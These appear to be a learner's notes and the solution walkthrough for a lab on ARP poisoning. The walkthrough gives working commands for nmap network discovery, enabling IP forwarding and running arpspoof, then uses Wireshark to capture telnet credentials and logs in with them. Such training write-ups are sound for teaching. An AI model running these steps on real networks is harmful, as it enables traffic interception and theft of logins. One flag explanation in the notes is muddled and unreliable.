* The command `echo 1 > /proc/sys/net/ipv4/ip_forward` is used to modify a system parameter in a Linux-based operating system. Let's break it down:
    
    * echo: This command is used in Linux to display a line of text/string on the terminal.
    
    * 1: This is the value being echoed or written.
    
    * ">": This is a redirection operator in Linux. It redirects the output of the command on the left (echo 1) to the file on the right (/proc/sys/net/ipv4/ip_forward in this case).
    
    * /proc/sys/net/ipv4/ip_forward: This is the location of a system file that controls IP forwarding in a Linux system. IP forwarding determines whether the system will forward network packets from one network interface to another.
    
    * Setting ip_forward to 1 enables packet forwarding, allowing the system to act as a router, forwarding packets between different network interfaces or subnets. When IP forwarding is enabled (ip_forward=1),         the       system forwards packets between its network interfaces based on its routing table.
 

********************

Q: How does above statement helps in ARP spoofing? 
* The `echo` command you provided earlier (`echo 1 > /proc/sys/net/ipv4/ip_forward`) enables IP forwarding on a Linux system.
* While enabling IP forwarding is not directly related to ARP spoofing, it can be beneficial in certain scenarios where the attacker wants to ensure that the traffic forwarded between the victim and the target passes through their machine.

* Enabling IP forwarding allows the attacker's machine to act as a router, forwarding packets between different network interfaces. In the context of an ARP spoofing attack, this can be useful because it ensures that traffic between the victim (`10.100.13.37`) and the target (`10.100.13.36`) flows through the attacker's machine. This is crucial for intercepting or modifying the traffic between these two hosts effectively.

* However, enabling IP forwarding alone doesn't initiate ARP spoofing. ARP spoofing involves sending falsified ARP messages to associate the attacker's MAC address with the IP address of another machine on the network.

* So, while enabling IP forwarding can complement an ARP spoofing attack, it's not a mandatory step for ARP spoofing itself. It serves to ensure that the attacker's machine efficiently forwards traffic between the victim and the target, facilitating the interception or manipulation of that traffic.


************************

* The command you provided, `arpspoof -i eth1 -t 10.100.13.37 -r 10.100.13.36`, is used for ARP (Address Resolution Protocol) spoofing, a technique used in network attacks. Let's break it down:

* - `arpspoof`: This is a command-line tool used to conduct ARP spoofing attacks. It allows a malicious user to intercept and modify traffic between two hosts by impersonating the IP addresses of those hosts.

* - `-i eth1`: This flag specifies the network interface (`eth1` in this case) that the attacker will use for the ARP spoofing attack. Network interfaces are the physical or virtual points of connection to a network.

* - `-t 10.100.13.37`: This flag indicates the target IP address (`10.100.13.37`) that the attacker wants to impersonate or spoof. The attacker will send ARP reply packets to the network, claiming that their machine's MAC address corresponds to the IP address `10.100.13.37`.

* - `-r 10.100.13.36`: This flag specifies another IP address (`10.100.13.36`) as the IP of the host whose traffic the attacker wants to intercept. The ARP packets sent by the attacker will indicate that the IP address `10.100.13.37` is associated with their MAC address and not the actual MAC address of the host with IP `10.100.13.37`.

In summary, this command is used to perform a man-in-the-middle (MITM) attack by spoofing ARP replies. It tricks two hosts (`10.100.13.37` and `10.100.13.36`) into sending their traffic through the attacker's machine, allowing the attacker to intercept, modify, or analyze the traffic passing between these hosts. This type of attack can be used for malicious purposes, such as eavesdropping or altering communication between two parties on a network.

* Right click on the packets frames in Wireshark --> Stream TCP --> It would probably reveal username and password
* `telnet [IP]` --> Then add the credentials and we can get access to telnet.

Solution
Step 1: Open the lab link to access the Kali GUI instance.

1

Step 2: Open the terminal by clicking the terminal icon on the task bar.

2

Step 3: Identify the IP address of the Kali Instance.

Command

ip addr
3
The IP address of the Kali instance is 10.100.13.140 and the subnet mask is 24.

Step 4: Perform a nmap scan on the whole network

Command

nmap 10.100.13.0/24
4
The first machine is the gateway machine and is not to be attacked. The second machine corresponds to the telnet server (port 23 is open), the third is the client machine, and the fourth is the Kali instance.

Step 5: Configure the Kali instance to forward IP packets:

Command

echo 1 > /proc/sys/net/ipv4/ip_forward
5
Step 6: Perform the ARP poisoning attack

Command

arpspoof -i eth1 -t 10.100.13.37 -r 10.100.13.36
6
Step 7: Navigate to the "Sniffing & Spoofing" menu and start Wireshark

7

Step 8: Select the eth1 interface.

8

The traffic from eth1 interface will appear on Wireshark.

9

Step 9: Apply "telnet" filter to view the telnet traffic.

Command

telnet
10

Step 10: Follow the TCP stream. Right-click on a packet and click on TCP stream from Follow section.

11

The telnet login credentials are mentioned in the TCP stream

11_1

Step 11: Log in to the telnet server using the stolen credentials.

Telnet Credentials

Username: admin

Password: MyS3cr3tP455

11_2

Successfully logged in to the telnet server.

And that's how ARP poisoning can be performed to sniff sensitive information from the network.
